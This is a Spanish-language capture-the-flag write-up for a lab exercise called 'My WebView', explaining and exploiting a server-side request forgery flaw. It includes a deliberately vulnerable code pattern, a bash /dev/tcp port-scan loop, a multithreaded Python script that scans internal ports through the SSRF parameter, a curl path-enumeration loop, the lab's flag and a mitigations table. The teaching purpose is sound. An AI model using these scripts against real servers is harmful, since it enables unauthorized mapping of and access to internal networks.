---
id: my-webview
sidebar_position: 1
title: "My WebView"
tags: [intermedio, web-hacking, ssrf, reconocimiento, enumeracion]
---

# My WebView

| Campo | Valor |
|-------|-------|
| **Categoría** | Web Hacking |
| **Dificultad** | 🟡 Intermedio |
| **Herramientas** | curl, bash, Python 3 |
| **Concepto clave** | SSRF — Server-Side Request Forgery |
| **TTP** | Exploit Public-Facing Application / Exploitation for Client Execution |

## Enunciado

> Take control of the server to obtain the flag.
> The port range of the internal server is 1000 to 10000.

**Infraestructura del ejercicio:**

| Rol | IP | Puerto | Credenciales |
|-----|----|--------|--------------|
| Máquina de trabajo | `192.168.200.51` | — | user / user |
| Servidor externo (WebView) | `192.168.200.100` | 80 | — |
| Servidor interno (objetivo) | `192.168.200.110` | 1000–10000 | — |

---

## Reconocimiento

Al navegar a `http://192.168.200.100/` desde la máquina de trabajo, se presenta una aplicación llamada **My WebView**: un campo de texto que acepta una URL y un botón "Submit Query".

![My WebView — interfaz inicial](/img/wh-my-webview/wh_my_webview_01.png)

Inspeccionando el código fuente del formulario:

```bash
curl -s http://192.168.200.100/ | grep -i 'input\|form\|name='
```

![Código fuente del formulario](/img/wh-my-webview/wh_my_webview_02.png)

El formulario usa **método GET** y el campo se llama `url`. Esto significa que cualquier consulta se ejecuta como:

```
http://192.168.200.100/?url=<URL_INGRESADA>
```

---

## Teoría

### ¿Qué es SSRF?

**Server-Side Request Forgery (SSRF)** es una vulnerabilidad en la que un atacante logra que el **servidor** realice peticiones HTTP en su nombre hacia destinos arbitrarios — incluyendo recursos de la red interna que el atacante no puede alcanzar directamente.

El patrón vulnerable es simple:

```python
# Código vulnerable en el servidor
url = request.args.get('url')   # controlado por el atacante
response = requests.get(url)    # el SERVIDOR hace el fetch
return response.text            # el resultado llega al atacante
```

### SSRF vs XSS — una confusión frecuente

Al ver un campo de entrada en una aplicación web, el instinto inicial suele ser pensar en XSS. La diferencia clave es quién ejecuta el payload:

| | XSS | SSRF |
|---|---|---|
| ¿Quién ejecuta el payload? | El **navegador** de la víctima | El **servidor** |
| ¿Qué se inyecta? | JavaScript | Una URL |
| Objetivo | Atacar a otro usuario | Acceder a la red interna del servidor |
| ¿Cómo identificarlo? | Campo de texto libre con reflejo en HTML | Campo que acepta URLs y el servidor las fetcha |

La señal que descarta XSS aquí: el campo pide explícitamente una URL (`placeholder="https://www.google.com"`), y la respuesta "Unable to connect" proviene del servidor — no del navegador.

### Por qué SSRF es peligroso: topología de red

En entornos reales, los servidores web viven en una **zona desmilitarizada (DMZ)** con acceso a redes internas que los usuarios externos no pueden alcanzar:

```
Internet / Usuario
        │
        ▼
┌──────────────────┐
│  Servidor externo │  ← accesible desde fuera
│  192.168.200.100  │
└────────┬─────────┘
         │  red interna (solo accesible desde aquí)
         ▼
┌──────────────────┐
│  Servidor interno │  ← NO accesible desde fuera
│  192.168.200.110  │
└──────────────────┘
```

El atacante no puede llegar a `.110` directamente. Pero si convence al servidor `.100` de hacer el request por él, usa `.100` como **proxy involuntario** hacia la red interna.

### Señales que confirman SSRF

Cuando probamos URLs de puertos cerrados en `.110`, el servidor devuelve `"Unable to connect"`. Esta respuesta viene del **servidor**, no del navegador — prueba que el servidor está haciendo el fetch. Si el navegador no pudiera conectar, el error sería del propio browser, no un texto en la página.

---

## Explotación

### Paso 1 — Confirmar SSRF

Ingresamos una URL del servidor interno en el WebView:

```
http://192.168.200.110:1000/
```

La respuesta `"Unable to connect"` confirma que el servidor externo intenta el fetch — SSRF está activo.

### Paso 2 — Encontrar el puerto abierto

Con 9000 puertos a explorar, el escaneo manual no es viable. Usamos `/dev/tcp` de bash — disponible sin instalar nada — para escaneo TCP directo:

```bash
for port in $(seq 1000 10000); do
    (echo >/dev/tcp/192.168.200.110/$port) 2>/dev/null && echo "Puerto $port abierto" && break
done
```

Resultado: **puerto 8081 abierto**.

Alternativamente, si solo se pudiera acceder al servidor interno a través del WebView, el siguiente script Python escanea todos los puertos vía SSRF con 50 hilos en paralelo (~3 minutos):

```python
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET     = "http://192.168.200.100/"
INTERNAL   = "192.168.200.110"
PORT_START = 1000
PORT_END   = 10000
WORKERS    = 50
DEAD_RESP  = "Unable to connect"

def probe(port):
    url  = f"http://{INTERNAL}:{port}/"
    full = TARGET + "?" + urllib.parse.urlencode({"url": url})
    try:
        with urllib.request.urlopen(full, timeout=3) as r:
            body = r.read().decode(errors="replace").strip()
        if DEAD_RESP not in body:
            return port, body
    except Exception:
        pass
    return port, None

with ThreadPoolExecutor(max_workers=WORKERS) as ex:
    futures = {ex.submit(probe, p): p for p in range(PORT_START, PORT_END + 1)}
    for f in as_completed(futures):
        port, body = f.result()
        if body:
            print(f"[+] Puerto {port}: {body}")
```

### Paso 3 — Acceder al servidor interno vía SSRF

Ingresamos `http://192.168.200.110:8081/` en el WebView:

![WebView consultando servidor interno](/img/wh-my-webview/wh_my_webview_03.png)

El servidor responde `Hello World!` — está activo, pero la flag no está en la raíz.

![Respuesta Hello World del servidor interno](/img/wh-my-webview/wh_my_webview_04.png)

### Paso 4 — Enumerar rutas del servidor interno

Probamos rutas comunes vía SSRF con curl:

```bash
for path in /flag /flag.txt /secret /secret.txt /admin /.flag /api/flag /var/flag; do
    echo -n "$path: "
    curl -s "http://192.168.200.100/?url=http://192.168.200.110:8081$path"
    echo
done
```

![Enumeración de rutas — flag encontrada](/img/wh-my-webview/wh_my_webview_05.png)

La ruta `/flag` devuelve la flag directamente. La ruta `/flag.txt` devuelve `Cannot GET /flag.txt` — el servidor distingue extensiones.

**Flag:** `flag_4mva6rje7vy0gvz`

---

## ¿Qué aprendimos?

- **SSRF convierte el servidor en un proxy.** Cualquier recurso accesible desde el servidor — puertos internos, APIs de administración, metadatos de cloud — queda expuesto al atacante.
- **La señal de SSRF es la respuesta del servidor.** `"Unable to connect"` en el cuerpo de la página viene del servidor, no del navegador. Eso prueba que el servidor está haciendo el fetch.
- **El escaneo de puertos vía SSRF es viable.** Con respuestas diferenciadas para puertos abiertos vs cerrados, se puede mapear la red interna completa sin herramientas externas.
- **Enumerar rutas es parte del ataque.** Encontrar el servidor no es suficiente — hay que explorar su superficie. Rutas como `/flag`, `/admin`, `/api/*` son los primeros candidatos.

:::note[Callejón sin salida explorado]

El primer instinto fue intentar XSS en el campo de entrada. La pista que lo descartó: el campo pide una URL (no texto libre), y la respuesta `"Unable to connect"` llegó dentro de la página — generada por el servidor, no por el navegador.

:::

---

## Mitigaciones

Para prevenir SSRF en aplicaciones reales:

| Medida | Descripción |
|--------|-------------|
| **Allowlist de dominios** | Solo permitir fetch a hosts explícitamente aprobados |
| **Bloquear IPs privadas** | Rechazar rangos `10.x`, `172.16.x`, `192.168.x` en la URL ingresada |
| **Deshabilitar esquemas peligrosos** | Bloquear `file://`, `gopher://`, `dict://` |
| **Segmentación de red** | El servidor interno no debe ser alcanzable desde la DMZ sin autenticación |
| **Respuestas uniformes** | No devolver mensajes de error del servidor interno — evita confirmar puertos abiertos |
